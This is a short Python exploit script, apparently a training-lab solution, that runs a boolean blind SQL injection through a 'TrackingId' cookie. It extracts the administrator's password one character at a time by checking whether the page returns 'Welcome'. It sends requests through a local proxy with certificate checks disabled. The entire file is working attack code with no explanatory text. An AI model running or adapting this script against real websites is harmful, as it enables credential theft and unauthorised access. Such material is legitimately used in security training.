import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_admin_pass(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sql_payload = "' AND (SELECT ascii(SUBSTRING(password, %s, 1)) FROM users WHERE username = 'administrator') = '%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': 'iavRdFDiiZD877vy' + sqli_payload_encoded, 'session': 'uqNIZ2XuRcsr9nSPHEbmJDBZTlfxySgq'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.exapmle.com' % sys.argv[0])
            
    url = sys.argv[1].strip()
    print('[+] Returning the administrator password...')
    sqli_admin_pass(url)


if __name__ == '__main__':
    main()

